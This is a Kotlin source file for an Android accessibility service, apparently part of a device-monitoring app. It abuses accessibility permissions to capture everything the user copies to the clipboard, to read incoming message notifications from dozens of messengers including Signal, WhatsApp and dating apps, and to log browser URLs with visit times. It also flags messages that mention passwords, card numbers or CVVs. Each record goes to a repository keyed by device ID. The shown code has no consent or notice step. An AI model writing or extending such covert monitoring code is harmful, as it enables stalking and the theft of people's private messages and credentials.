package com.devicemonitor.service

import android.accessibilityservice.AccessibilityService
import android.content.ClipboardManager
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.devicemonitor.data.models.ClipboardEntry
import com.devicemonitor.data.models.MessengerMessage
import com.devicemonitor.data.models.RiskAlert
import com.devicemonitor.data.models.WebHistory
import com.devicemonitor.data.repository.DeviceRepository
import com.devicemonitor.utils.Constants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MonitorAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val repository = DeviceRepository()
    private var lastClipboardText: String? = null
    private val processedMessages = mutableSetOf<String>()
    private val MAX_PROCESSED_MESSAGES = 1000

    // Sensitive words for risk alert detection
    private val sensitiveWords = listOf(
        "secret meeting", "hidden location", "danger", "help", "kidnap", "threat",
        "ransom", "password", "credit card", "bank account", "social security",
        "ssn", "cvv", "pin number", "confidential", "secret", "private"
    )

    // Web History Tracking
    private var currentUrl: String? = null
    private var currentTitle: String? = null
    private var currentEntryTime: Long? = null
    private var currentBrowserPackage: String? = null

    private val browserPackages = setOf(
        "com.android.chrome",
        "com.chrome.beta",
        "com.chrome.dev",
        "com.chrome.canary",
        "org.mozilla.firefox",
        "org.mozilla.firefox_beta",
        "com.opera.browser",
        "com.opera.mini.native",
        "com.sec.android.app.sbrowser",
        "com.microsoft.emmx",
        "com.brave.browser",
        "com.vivaldi.browser",
        "com.duckduckgo.mobile.android",
        "com.uc.browser",
        "com.uc.browser.en",
        "com.cloudmosa.puffinFree"
    )

    private val supportedMessengers = mapOf(
        // সাধারণ মেসেজিং অ্যাপ
        "com.whatsapp" to "whatsapp",
        "com.whatsapp.w4b" to "whatsapp_business",
        "org.telegram.messenger" to "telegram",
        "org.telegram.messenger.web" to "telegram_x",
        "com.facebook.orca" to "messenger",
        "com.facebook.mlite" to "messenger_lite",
        "com.tencent.mm" to "wechat",
        "org.thoughtcrime.securesms" to "signal",
        "com.viber.voip" to "viber",
        "jp.naver.line.android" to "line",
        "com.imo.android.imoim" to "imo",
        "com.snapchat.android" to "snapchat",
        "com.discord" to "discord",

        // গেমিং/কমিউনিটি ফোকাসড
        "com.valvesoftware.android.steam.community" to "steam_chat",

        // বিজনেস/প্রফেশনাল
        "com.Slack" to "slack",
        "com.microsoft.teams" to "microsoft_teams",
        "com.google.android.apps.dynamite" to "google_chat",

        // বাংলাদেশে বেশি জনপ্রিয় (আগে যোগ করা আছে)

        // প্রাইভেসি-ফোকাসড
        "ch.threema.app" to "threema",
        "com.mywickr.wickr2" to "wickr",
        "network.loki.messenger" to "session",
        "com.wire" to "wire",

        // রিজিওনাল/দেশভিত্তিক জনপ্রিয়
        "com.kakao.talk" to "kakaotalk",
        "com.zing.zalo" to "zalo",
        "com.turkcell.bip" to "bip",
        "com.etisalat.botim" to "botim",
        "com.skype.raider" to "skype",

        // ডেটিং/সোশ্যাল চ্যাট
        "com.tinder" to "tinder",
        "com.bumble.app" to "bumble",
        "com.tagged.android" to "tagged",
        "com.meetme.android" to "meetme",

        // গ্রুপ/কমিউনিটি বেসড
        "com.groupme.android" to "groupme",
        "com.nhn.android.band" to "band",
        "kik.android" to "kik",

        // ভিডিও কল ফোকাসড চ্যাট অ্যাপ
        "com.google.android.apps.tachyon" to "google_meet", // Google Duo / Meet
        "com.skype.raider" to "skype", // Already added
        // FaceTime is iOS only, so no Android package

        // পুরনো/কম পরিচিত কিন্তু এখনও আছে
        "com.icq.mobile.client" to "icq",
        "com.bsb.hike" to "hike_messenger",
        "com.sgiggle.production" to "tango",

        // অন্যান্য
        "com.google.android.apps.messaging" to "google_messages",
        "com.instagram.android" to "instagram",
        "com.facebook.katana" to "facebook",
        "com.zhiliaoapp.musically" to "tiktok",
        "com.vsco.cam" to "vsco"
    )

    private lateinit var clipboardManager: ClipboardManager
    private val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
        val clip = clipboardManager.primaryClip
        if (clip != null && clip.itemCount > 0) {
            val text = clip.getItemAt(0).text?.toString()
            if (!text.isNullOrBlank() && text != lastClipboardText) {
                lastClipboardText = text
                val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
                val entry = ClipboardEntry(
                    device_id = Constants.DEVICE_ID,
                    content = text,
                    recorded_at = timestamp
                )
                serviceScope.launch {
                    try {
                        repository.insertClipboardEntry(entry)
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardManager.addPrimaryClipChangedListener(clipboardListener)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                handleNotification(event)
            }
        }
        handleWebHistory(event)
    }

    private fun handleNotification(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val messengerType = supportedMessengers[packageName] ?: return

        val title = event.text?.firstOrNull()?.toString() ?: "Unknown"
        val text = event.text?.getOrNull(1)?.toString() ?: ""

        if (text.isBlank()) return

        // Create a unique key to avoid duplicates
        val messageKey = "$messengerType|$title|$text|${System.currentTimeMillis() / 10000}"
        if (processedMessages.contains(messageKey)) return

        // Keep the set size manageable
        if (processedMessages.size >= MAX_PROCESSED_MESSAGES) {
            processedMessages.clear()
        }
        processedMessages.add(messageKey)

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
        val message = MessengerMessage(
            device_id = Constants.DEVICE_ID,
            messenger_type = messengerType,
            contact_name = title,
            content = text,
            message_type = "received",
            recorded_at = timestamp
        )

        serviceScope.launch {
            try {
                repository.insertMessengerMessage(message)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }

        // Check for sensitive words
        checkForSensitiveWords(text, messengerType, title)
    }

    private fun checkForSensitiveWords(content: String, source: String, contactName: String) {
        val lowerContent = content.lowercase()
        val detectedWords = sensitiveWords.filter { word -> lowerContent.contains(word.lowercase()) }

        if (detectedWords.isNotEmpty()) {
            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault()).format(Date())
            val alert = RiskAlert(
                device_id = Constants.DEVICE_ID,
                alert_type = "sensitive_word",
                description = "Detected sensitive word(s): ${detectedWords.joinToString(", ")}",
                source = source,
                content = content,
                recorded_at = timestamp
            )

            serviceScope.launch {
                try {
                    repository.insertRiskAlert(alert)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    private fun extractMessageFromNode(root: AccessibilityNodeInfo?, packageName: String) {
        // Implementation for extracting messages from screen content
        // This is complex and app-specific, but we can add basic extraction
    }

    // Web History Tracking Functions
    private fun handleWebHistory(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (!browserPackages.contains(packageName)) return

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            val rootNode = rootInActiveWindow ?: return
            val (url, title) = extractUrlAndTitle(rootNode, packageName)

            if (url != null && url != currentUrl) {
                // Save previous session if exists
                saveCurrentWebSession()
                // Start new session
                currentUrl = url
                currentTitle = title
                currentEntryTime = System.currentTimeMillis()
                currentBrowserPackage = packageName
            }
        }
    }

    private fun extractUrlAndTitle(root: AccessibilityNodeInfo, packageName: String): Pair<String?, String?> {
        var url: String? = null
        var title: String? = null

        // Try to find URL bar and title text
        val nodes = mutableListOf<AccessibilityNodeInfo>()
        collectAllNodes(root, nodes)

        for (node in nodes) {
            val text = node.text?.toString()
            val contentDesc = node.contentDescription?.toString()

            // Check if text looks like a URL
            if (text != null && (text.startsWith("http://") || text.startsWith("https://") || text.contains("www."))) {
                url = if (!text.startsWith("http")) "https://$text" else text
            }

            // Try to get page title (look for large text or specific node IDs)
            if (title == null && text != null && text.length > 5) {
                title = text
            }
        }

        return Pair(url, title)
    }

    private fun collectAllNodes(node: AccessibilityNodeInfo, list: MutableList<AccessibilityNodeInfo>) {
        list.add(node)
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != null) {
                collectAllNodes(child, list)
            }
        }
    }

    private fun saveCurrentWebSession() {
        val url = currentUrl ?: return
        val entryTime = currentEntryTime ?: return
        val exitTime = System.currentTimeMillis()
        val duration = (exitTime - entryTime) / 1000

        // Try to detect incognito mode (limited detection capability)
        val browsingMode = if (currentBrowserPackage?.contains("incognito", ignoreCase = true) == true) {
            "incognito"
        } else {
            "standard"
        }

        val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.getDefault())
        val webHistory = WebHistory(
            device_id = Constants.DEVICE_ID,
            url = url,
            title = currentTitle,
            entry_time = dateFormat.format(Date(entryTime)),
            exit_time = dateFormat.format(Date(exitTime)),
            duration_seconds = duration,
            browsing_mode = browsingMode,
            recorded_at = dateFormat.format(Date())
        )

        serviceScope.launch {
            try {
                repository.insertWebHistory(webHistory)
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        clipboardManager.removePrimaryClipChangedListener(clipboardListener)
        saveCurrentWebSession()
    }
}
